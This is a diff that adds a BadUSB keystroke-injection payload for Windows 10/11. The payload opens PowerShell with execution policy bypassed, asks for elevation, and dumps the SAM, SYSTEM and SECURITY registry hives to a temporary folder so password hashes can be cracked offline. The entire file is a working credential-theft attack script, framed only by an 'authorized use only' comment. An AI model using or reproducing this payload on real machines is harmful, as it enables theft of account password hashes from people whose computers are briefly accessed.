@@ -1,0 +1,14 @@
+REM ==============================================
+REM CYBERFLIPPER — SAM/SYSTEM Hash Dump
+REM Exports SAM and SYSTEM hives for offline
+REM password cracking (authorized use only)
+REM ==============================================
+REM TARGET: Windows 10/11
+REM AUTHOR: @CYBERFLIPPER / FLLC
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$dir = $env:TEMP + \\\"\hash_audit\\\"; New-Item -ItemType Directory -Force -Path $dir; reg save HKLM\SAM $dir\SAM.hiv /y; reg save HKLM\SYSTEM $dir\SYSTEM.hiv /y; reg save HKLM\SECURITY $dir\SECURITY.hiv /y; Write-Host \\\"Hives saved to $dir\\\"\"' -WindowStyle Hidden"
+ENTER
+DELAY 5000
